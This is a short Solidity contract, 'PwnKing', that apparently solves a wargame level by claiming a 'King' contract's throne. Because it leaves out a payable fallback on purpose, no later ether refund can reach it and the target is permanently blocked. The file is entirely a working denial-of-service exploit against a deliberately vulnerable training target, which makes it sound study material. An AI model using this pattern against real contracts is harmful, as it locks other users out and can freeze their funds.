// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./king.sol";
import "hardhat/console.sol";

/**
 * @title Pwn King
 * @author Holly Grimm
 * @notice Pwn King
 */
contract PwnKing {
    // @dev Address of Original King Contract
    address payable private _kingContractAddress;

    constructor(address payable kingContractAddress) public {
        _kingContractAddress = kingContractAddress;
    }

    function pwn() public payable {
        (bool result, ) = _kingContractAddress.call.value(msg.value)("");
        if (!result) revert("reverted");
    }

    // Purposely omitting fallback function
    // fallback() external payable {
    // }
}
